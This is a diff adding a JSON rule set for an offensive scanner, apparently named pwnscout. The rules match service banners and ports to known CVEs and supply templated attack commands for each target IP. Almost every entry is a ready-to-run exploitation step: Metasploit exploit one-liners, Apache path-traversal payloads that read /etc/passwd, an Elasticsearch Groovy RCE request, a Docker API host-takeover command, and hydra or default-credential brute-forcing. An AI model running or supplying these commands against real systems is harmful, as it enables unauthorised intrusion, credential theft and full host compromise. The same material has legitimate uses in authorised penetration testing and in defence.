@@ -1,0 +1,265 @@
+[
+  {
+    "id": "vsftpd-234-backdoor",
+    "match": {"product": "vsftpd", "version": "2.3.4"},
+    "cve": "CVE-2011-2523",
+    "title": "vsftpd 2.3.4 smiley-face backdoor (root RCE)",
+    "severity": "critical",
+    "tags": ["rce", "exploit-available", "backdoor", "unauth"],
+    "why": "This exact build shipped from a compromised mirror with a backdoor: a username ending in ':)' opens a root shell on 6200/tcp. Trivial, reliable root.",
+    "next_step": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor;set RHOSTS {ip};run'",
+    "refs": ["https://www.exploit-db.com/exploits/17491"]
+  },
+  {
+    "id": "proftpd-135-modcopy",
+    "match": {"product": "ProFTPD", "version": "1.3.5"},
+    "cve": "CVE-2015-3306",
+    "title": "ProFTPD 1.3.5 mod_copy unauthenticated file copy -> RCE",
+    "severity": "critical",
+    "tags": ["rce", "exploit-available", "unauth"],
+    "why": "mod_copy exposes SITE CPFR/CPTO without auth; copy a PHP payload into the webroot for code execution.",
+    "next_step": "searchsploit proftpd 1.3.5 ; msfconsole -q -x 'use exploit/unix/ftp/proftpd_modcopy_exec;set RHOSTS {ip};run'",
+    "refs": ["https://www.exploit-db.com/exploits/36803"]
+  },
+  {
+    "id": "openssh-userenum-77",
+    "match": {"product": "OpenSSH", "version_lt": "7.7"},
+    "cve": "CVE-2018-15473",
+    "title": "OpenSSH < 7.7 username enumeration",
+    "severity": "medium",
+    "tags": ["user-enum"],
+    "why": "Pre-7.7 sshd reveals whether a username exists via timing/response differences — build a valid user list for spraying.",
+    "next_step": "python3 sshuserenum.py --port {port} --userList users.txt {ip}",
+    "refs": ["https://www.exploit-db.com/exploits/45939"]
+  },
+  {
+    "id": "libssh-authbypass",
+    "match": {"banner_regex": "libssh[-_ ]?0\\.(6|7|8)"},
+    "cve": "CVE-2018-10933",
+    "title": "libssh 0.6-0.8 authentication bypass",
+    "severity": "critical",
+    "tags": ["auth-bypass", "exploit-available", "unauth"],
+    "why": "Server-side libssh accepts a client-sent SSH2_MSG_USERAUTH_SUCCESS, letting you skip authentication entirely.",
+    "next_step": "python3 libssh_authbypass.py -t {ip} -p {port} --cmd id",
+    "refs": ["https://www.exploit-db.com/exploits/46307"]
+  },
+  {
+    "id": "apache-2449-traversal",
+    "match": {"product": "Apache", "version": "2.4.49"},
+    "cve": "CVE-2021-41773",
+    "title": "Apache httpd 2.4.49 path traversal + RCE",
+    "severity": "critical",
+    "tags": ["rce", "lfi", "exploit-available", "unauth"],
+    "why": "Path normalization flaw allows ../ traversal; with mod_cgi enabled it becomes remote code execution.",
+    "next_step": "curl -s --path-as-is '{scheme}://{ip}:{port}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'",
+    "refs": ["https://www.exploit-db.com/exploits/50383"]
+  },
+  {
+    "id": "apache-2450-traversal",
+    "match": {"product": "Apache", "version": "2.4.50"},
+    "cve": "CVE-2021-42013",
+    "title": "Apache httpd 2.4.50 path traversal + RCE (41773 bypass)",
+    "severity": "critical",
+    "tags": ["rce", "lfi", "exploit-available", "unauth"],
+    "why": "The 2.4.49 fix was incomplete; double-encoding restores traversal and RCE via mod_cgi.",
+    "next_step": "curl -s --path-as-is '{scheme}://{ip}:{port}/cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'",
+    "refs": ["https://www.exploit-db.com/exploits/50406"]
+  },
+  {
+    "id": "samba-sambacry",
+    "match": {"product": "Samba", "version_ge": "3.5.0", "version_le": "4.6.4"},
+    "cve": "CVE-2017-7494",
+    "title": "Samba 3.5.0-4.6.4 is_known_pipename() RCE (SambaCry)",
+    "severity": "critical",
+    "tags": ["rce", "exploit-available"],
+    "why": "A writable share lets you load a malicious .so via a crafted pipe name and execute it as the smbd user.",
+    "next_step": "msfconsole -q -x 'use exploit/linux/samba/is_known_pipename;set RHOSTS {ip};run'",
+    "refs": ["https://www.samba.org/samba/security/CVE-2017-7494.html"]
+  },
+  {
+    "id": "iis6-webdav",
+    "match": {"product": "Microsoft-IIS", "version": "6.0"},
+    "cve": "CVE-2017-7269",
+    "title": "Microsoft IIS 6.0 WebDAV ScStoragePathFromUrl RCE",
+    "severity": "critical",
+    "tags": ["rce", "exploit-available"],
+    "why": "WebDAV PROPFIND buffer overflow on IIS 6.0 gives remote code execution against this end-of-life server.",
+    "next_step": "msfconsole -q -x 'use exploit/windows/iis/iis_webdav_scstoragepathfromurl;set RHOSTS {ip};run'",
+    "refs": ["https://www.exploit-db.com/exploits/41738"]
+  },
+  {
+    "id": "tomcat-ajp-ghostcat",
+    "match": {"port": 8009},
+    "title": "Apache Tomcat AJP connector exposed (Ghostcat)",
+    "cve": "CVE-2020-1938",
+    "severity": "high",
+    "tags": ["lfi", "exploit-available"],
+    "why": "An exposed AJP/1.3 connector (8009) lets you read files under the webapp (e.g. WEB-INF/web.config) and, if uploads exist, achieve RCE.",
+    "next_step": "python3 ajpShooter.py http://{ip}:8080 8009 /WEB-INF/web.xml read",
+    "refs": ["https://www.exploit-db.com/exploits/48143"]
+  },
+  {
+    "id": "elasticsearch-groovy",
+    "match": {"product": "Elasticsearch", "version_lt": "1.4.3"},
+    "cve": "CVE-2015-1427",
+    "title": "Elasticsearch < 1.4.3 Groovy sandbox bypass RCE",
+    "severity": "critical",
+    "tags": ["rce", "exploit-available", "unauth"],
+    "why": "The Groovy scripting sandbox can be escaped through the _search API to run OS commands unauthenticated.",
+    "next_step": "curl -s 'http://{ip}:{port}/_search?pretty' -d '{\"script_fields\":{\"x\":{\"lang\":\"groovy\",\"script\":\"java.lang.Runtime.getRuntime().exec(\\\"id\\\")\"}}}'",
+    "refs": ["https://www.exploit-db.com/exploits/36337"]
+  },
+  {
+    "id": "redis-version-note",
+    "match": {"product": "redis", "banner_regex": "redis_version"},
+    "title": "Redis server reachable — check for no-auth RCE",
+    "severity": "high",
+    "tags": ["unauth", "rce"],
+    "why": "If Redis has no requirepass, you can write an SSH key, cron job, or module for code execution. pwnscout's verify stage checks auth automatically.",
+    "next_step": "redis-cli -h {ip} -p {port} info server ; redis-cli -h {ip} -p {port} config get dir",
+    "refs": ["https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis"]
+  },
+  {
+    "id": "smtp-open-relay",
+    "match": {"product": "", "banner_regex": "220[ -].*(Postfix|Exim|Sendmail|SMTP)"},
+    "title": "SMTP service — test for open relay and user enumeration",
+    "severity": "low",
+    "tags": ["recon"],
+    "why": "SMTP often leaks valid users via VRFY/EXPN/RCPT and may relay mail. Useful for phishing pretext and user lists.",
+    "next_step": "smtp-user-enum -M RCPT -U users.txt -t {ip} ; nmap -p{port} --script smtp-open-relay {ip}",
+    "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp"]
+  },
+  {
+    "id": "exim-cve-2019-10149",
+    "match": {"product": "Exim", "version_ge": "4.87", "version_le": "4.91"},
+    "cve": "CVE-2019-10149",
+    "title": "Exim 4.87-4.91 RCE (The Return of the WIZard)",
+    "severity": "critical",
+    "tags": ["rce", "exploit-available"],
+    "why": "A crafted recipient address triggers command execution as root in this Exim range.",
+    "next_step": "msfconsole -q -x 'use exploit/linux/smtp/exim4_deliver_message_priv_esc;set RHOSTS {ip};run'",
+    "refs": ["https://www.exploit-db.com/exploits/46974"]
+  },
+  {
+    "id": "mysql-exposed",
+    "match": {"product": "MySQL", "banner_regex": "mysql"},
+    "title": "MySQL/MariaDB exposed to network",
+    "severity": "medium",
+    "tags": ["recon", "default-creds"],
+    "why": "A network-reachable MySQL invites credential attacks (root with blank/weak password is common on lab and CTF boxes).",
+    "next_step": "mysql -h {ip} -P {port} -u root --password='' -e 'show databases;' ; hydra -l root -P rockyou.txt {ip} mysql",
+    "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql"]
+  },
+  {
+    "id": "mssql-exposed",
+    "match": {"port": 1433},
+    "title": "Microsoft SQL Server exposed (1433)",
+    "severity": "medium",
+    "tags": ["recon", "default-creds"],
+    "why": "MSSQL with sa and a weak password enables xp_cmdshell code execution. Impacket's mssqlclient makes this fast.",
+    "next_step": "impacket-mssqlclient sa:'password'@{ip} ; nmap -p1433 --script ms-sql-info,ms-sql-empty-password {ip}",
+    "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server"]
+  },
+  {
+    "id": "smb-eternalblue-hint",
+    "match": {"port": 445},
+    "title": "SMB (445) open — check MS17-010 / SMBv1",
+    "cve": "CVE-2017-0144",
+    "severity": "high",
+    "tags": ["rce"],
+    "why": "If SMBv1 is enabled this box may be EternalBlue-vulnerable — one of the most reliable Windows RCEs. Confirm before firing.",
+    "next_step": "nmap -p445 --script smb-vuln-ms17-010 {ip} ; nmap -p445 --script smb-protocols {ip}",
+    "refs": ["https://learn.microsoft.com/security-updates/securitybulletins/2017/ms17-010"]
+  },
+  {
+    "id": "rdp-bluekeep-hint",
+    "match": {"port": 3389},
+    "title": "RDP (3389) open — check BlueKeep / NLA",
+    "cve": "CVE-2019-0708",
+    "severity": "medium",
+    "tags": ["rce"],
+    "why": "Legacy Windows without NLA may be BlueKeep-vulnerable (pre-auth RCE) and is always a credential-spray target.",
+    "next_step": "nmap -p3389 --script rdp-ntlm-info,rdp-vuln-ms12-020 {ip} ; rdesktop {ip}",
+    "refs": ["https://learn.microsoft.com/security-updates/securitybulletins/2019/cve-2019-0708"]
+  },
+  {
+    "id": "vnc-noauth",
+    "match": {"banner_regex": "RFB 00"},
+    "title": "VNC service exposed — test for no/weak auth",
+    "severity": "high",
+    "tags": ["unauth", "default-creds"],
+    "why": "VNC frequently has no password or a trivially crackable one, granting instant interactive desktop access.",
+    "next_step": "nmap -p{port} --script vnc-info,realvnc-auth-bypass {ip} ; vncviewer {ip}::{port}",
+    "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc"]
+  },
+  {
+    "id": "snmp-public",
+    "match": {"port": 161},
+    "title": "SNMP (161/udp) — try public/private community strings",
+    "severity": "medium",
+    "tags": ["recon", "default-creds"],
+    "why": "Default community strings dump processes, users, routes, and sometimes credentials in enterprise gear.",
+    "next_step": "snmpwalk -v2c -c public {ip} ; onesixtyone -c community.txt {ip}",
+    "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp"]
+  },
+  {
+    "id": "nfs-exports",
+    "match": {"port": 2049},
+    "title": "NFS (2049) exposed — enumerate exports",
+    "severity": "medium",
+    "tags": ["recon", "misconfig"],
+    "why": "World-readable/writable exports (and no_root_squash) leak files or enable privilege escalation via crafted SUID binaries.",
+    "next_step": "showmount -e {ip} ; mkdir /mnt/nfs && mount -t nfs {ip}:/ /mnt/nfs -o nolock",
+    "refs": ["https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting"]
+  },
+  {
+    "id": "memcached-exposed",
+    "match": {"port": 11211},
+    "title": "Memcached exposed (11211) — no auth by design",
+    "severity": "medium",
+    "tags": ["unauth", "recon"],
+    "why": "Memcached has no auth; dump keys for cached sessions/tokens, and it is abusable for UDP amplification.",
+    "next_step": "echo -e 'stats\\nstats items\\nquit' | nc {ip} {port}",
+    "refs": ["https://book.hacktricks.xyz/network-services-pentesting/11211-memcache"]
+  },
+  {
+    "id": "rpcbind-exposed",
+    "match": {"port": 111},
+    "title": "rpcbind/portmapper (111) exposed",
+    "severity": "low",
+    "tags": ["recon"],
+    "why": "Enumerating RPC programs reveals NFS, NIS and other services (and their dynamic ports) to attack next.",
+    "next_step": "rpcinfo -p {ip} ; nmap -sSUC -p111 {ip}",
+    "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind"]
+  },
+  {
+    "id": "ldap-anon",
+    "match": {"port": 389},
+    "title": "LDAP (389) exposed — try anonymous bind",
+    "severity": "medium",
+    "tags": ["recon", "unauth"],
+    "why": "Anonymous LDAP bind on a Domain Controller dumps users, groups and sometimes description-field passwords.",
+    "next_step": "ldapsearch -x -H ldap://{ip} -s base namingcontexts ; ldapsearch -x -H ldap://{ip} -b 'DC=domain,DC=com'",
+    "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap"]
+  },
+  {
+    "id": "telnet-exposed",
+    "match": {"port": 23},
+    "title": "Telnet (23) exposed — cleartext + default creds",
+    "severity": "medium",
+    "tags": ["default-creds", "recon"],
+    "why": "Telnet sends credentials in cleartext and is usually IoT/network gear with vendor default logins.",
+    "next_step": "hydra -C defaults.txt telnet://{ip} ; nc {ip} {port}",
+    "refs": ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet"]
+  },
+  {
+    "id": "docker-api-exposed",
+    "match": {"port": 2375},
+    "title": "Docker Engine API exposed (2375) — instant host RCE",
+    "severity": "critical",
+    "tags": ["rce", "unauth"],
+    "why": "An unauthenticated Docker API lets you launch a container mounting the host filesystem — trivial full host compromise.",
+    "next_step": "docker -H tcp://{ip}:2375 ps ; docker -H tcp://{ip}:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh",
+    "refs": ["https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker"]
+  }
+]
